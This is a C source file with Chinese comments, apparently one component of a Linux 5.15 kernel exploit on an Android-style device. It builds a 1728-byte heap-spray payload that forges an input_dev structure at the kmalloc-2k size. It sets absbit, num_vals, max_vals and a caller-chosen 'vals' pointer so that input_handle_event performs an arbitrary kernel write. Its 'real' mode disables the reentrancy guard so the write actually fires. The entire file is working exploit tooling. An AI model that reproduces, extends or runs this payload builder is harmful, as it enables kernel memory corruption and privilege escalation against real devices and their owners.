/*
 * payload_build: 按反汇编结论构造 2k payload
 *
 * 关键偏移（本机 5.15.194 / input_dev size=0x5a0=1440）：
 *   0x028  evbit[0]       本路径不查
 *   0x098  absbit[0]      ★ +160 路径要求 absbit[code] 置位（code=0 → bit0）
 *   0x140  某指针，会被读，填 0
 *   0x148  某指针，会被读，填 0
 *   0x568  num_vals       ★ 起始 0
 *   0x56c  max_vals       ★ 必须 > num_vals
 *   0x570  vals 指针      ★ 写目标基址
 *   0x598  防重入标志      ★ 必须 0（否则 input_handle_event 直接返回）
 *
 * 用法: payload_build <mode> <vals_addr_hex> [outfile]
 *   mode = guard   0x598 = 0xFF  → 安全模式，input_handle_event 立刻返回
 *   mode = real    0x598 = 0     → 真实触发（危险）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PAYLOAD_SIZE 1728   /* 落 kmalloc-2k，与 0x5a0=1440 一致 */
#define OFF_ABS0   0x098
#define OFF_P140   0x140
#define OFF_P148   0x148
#define OFF_NUMV   0x568
#define OFF_MAXV   0x56c
#define OFF_VALS   0x570
#define OFF_GUARD  0x598

static void w64(unsigned char *b, size_t off, unsigned long long v) {
    memcpy(b + off, &v, 8);
}
static void w32(unsigned char *b, size_t off, unsigned int v) {
    memcpy(b + off, &v, 4);
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "guard";
    unsigned long long vals = 0;
    const char *out = argc > 3 ? argv[3] : "/data/local/tmp/payload.bin";

    if (argc > 2) {
        vals = strtoull(argv[2], NULL, 0);
    }

    static unsigned char buf[PAYLOAD_SIZE];
    memset(buf, 0, sizeof(buf));   /* 全 0 打底：这样所有"需为 0"的字段天然满足 */

    /* ★ absbit[0]：+160 路径 code=0，需要 bit0 = 1 */
    w64(buf, OFF_ABS0, 0x1ULL);

    /* 0x140 / 0x148 会被读，保持 0（memset 已保证） */

    /* ★ num_vals = 0，max_vals = 1 */
    w32(buf, OFF_NUMV, 0);
    w32(buf, OFF_MAXV, 1);

    /* ★ vals 指针 */
    w64(buf, OFF_VALS, vals);

    /* ★ 防重入标志 */
    if (!strcmp(mode, "guard")) {
        buf[OFF_GUARD] = 0xFF;   /* 非 0 → input_handle_event 第一步就返回 */
    } else {
        buf[OFF_GUARD] = 0x00;   /* 0 → 继续走，会真正写入 */
    }

    FILE *f = fopen(out, "wb");
    if (!f) { perror("open"); return 2; }
    if (fwrite(buf, 1, sizeof(buf), f) != sizeof(buf)) { fclose(f); return 3; }
    fclose(f);

    printf("=== payload built ===\n");
    printf("  mode      = %s\n", mode);
    printf("  size      = %d\n", PAYLOAD_SIZE);
    printf("  absbit[0] = 0x%llx  (0x098)\n", 0x1ULL);
    printf("  num_vals  = 0        (0x568)\n");
    printf("  max_vals  = 1        (0x56c)\n");
    printf("  vals      = 0x%016llx  (0x570)\n", vals);
    printf("  guard     = 0x%02x     (0x598)\n", buf[OFF_GUARD]);
    printf("  out       = %s\n", out);
    return 0;
}